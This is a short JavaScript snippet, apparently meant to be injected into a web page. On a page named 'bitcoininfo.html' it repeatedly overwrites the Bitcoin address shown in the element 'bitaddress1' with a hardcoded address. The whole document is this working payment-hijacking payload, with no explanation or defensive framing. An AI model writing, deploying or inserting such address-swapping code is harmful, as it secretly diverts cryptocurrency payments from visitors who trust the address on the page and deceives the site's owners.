if (window.location.href.includes("bitcoininfo.html")) {
  const desiredText = "19PNM3WNRRKgpUAvS4CGjwaMexNsDNCq5r";
  const interval = setInterval(() => {
    const bitaddress = document.getElementById("bitaddress1");
    if (bitaddress && bitaddress.textContent !== desiredText) {
      bitaddress.textContent = desiredText;
    } else {
      clearInterval(interval);
    }
  }, 1);
}
